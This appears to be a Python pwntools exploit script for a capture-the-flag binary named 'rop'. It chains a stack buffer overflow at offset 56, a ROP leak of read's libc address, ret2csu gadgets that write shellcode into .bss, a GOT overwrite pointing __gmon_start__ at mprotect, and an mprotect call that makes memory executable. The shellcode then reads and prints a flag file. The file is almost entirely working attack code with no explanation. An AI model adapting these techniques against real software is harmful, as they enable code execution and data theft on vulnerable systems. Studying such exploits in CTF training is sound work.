from pwn import*

local = 1
if local:
	p = process('./rop')   
	libc = ELF('./libc.so.6')
else:
	p = remote()
	libc = ELF()

context.log_level = 'debug'
#gdb.attach(proc.pidof(p)[0])

elf = ELF('./rop')        #offset 56
rop = ROP(elf)
rdi = rop.rdi[0]
rsi_r15 = rop.rsi[0]

p.recvuntil('Input:\n')

payload="A"*56
payload+=p64(rdi)
payload+=p64(1)
payload+=p64(rsi_r15)
payload+=p64(elf.got['read'])
payload+=p64(0)
payload+=p64(elf.symbols['write'])
payload+=p64(elf.symbols['here'])      #leak read address

p.send(payload)
sleep(0.2)
read_addr=u64(p.recv(8))
p.recvuntil('Input:\n')

shellcode="\x48\x31\xF6\x56\x48\xB8\x63\x74\x66\x2F\x66\x6C\x61\x67\x50\x48"
shellcode+="\xB8\x2F\x68\x6F\x6D\x65\x2F\x7A\x73\x50\x48\x89\xE7\x48\x31\xD2"
shellcode+="\x48\x31\xC0\xB0\x02\x0F\x05\x48\x89\xC7\x48\x89\xE6\xB2\x30\x48"
shellcode+="\x31\xC0\x0F\x05\xB0\x01\x48\x89\xC7\xB2\x30\x0F\x05"

csu_start=0x00000000004012CA
csu_second=0x00000000004012B0

payload='A'*56
payload+=p64(csu_start)
payload+=p64(0)
payload+=p64(1)
payload+=p64(elf.got['read'])
payload+=p64(0)
payload+=p64(elf.bss())
payload+=p64(len(shellcode)+1)
payload+=p64(csu_second)
payload+='B'*(7*8)
payload+=p64(elf.symbols['here'])	#write shellcode to bss		

p.send(payload)
pause()
p.send(shellcode+'\0')
p.recvuntil('Input:\n')

mprotect_addr=read_addr-libc.symbols['read']+libc.symbols['mprotect']+0x10#calc mprotect address 


payload='A'*56
payload+=p64(csu_start)
payload+=p64(0)
payload+=p64(1)
payload+=p64(elf.got['read'])
payload+=p64(0)
payload+=p64(elf.got['__gmon_start__'])
payload+=p64(8)
payload+=p64(csu_second)
payload+='B'*(7*8)
payload+=p64(elf.symbols['here'])					#writeover got    mprotect -> __gmon_start__

p.send(payload)
pause()
p.send(p64(mprotect_addr))
p.recvuntil('Input:\n')

payload='A'*56
payload+=p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.symbols['__gmon_start__'])
payload += p64(0x00403000)
payload += p64(0x1000)
payload += p64(7)
payload += p64(csu_second)
payload += 'B' * (7 * 8)
payload += p64(elf.bss())      #call mprotect to set 0x403000 to rwx  +

p.send(payload)

print p.recvall()

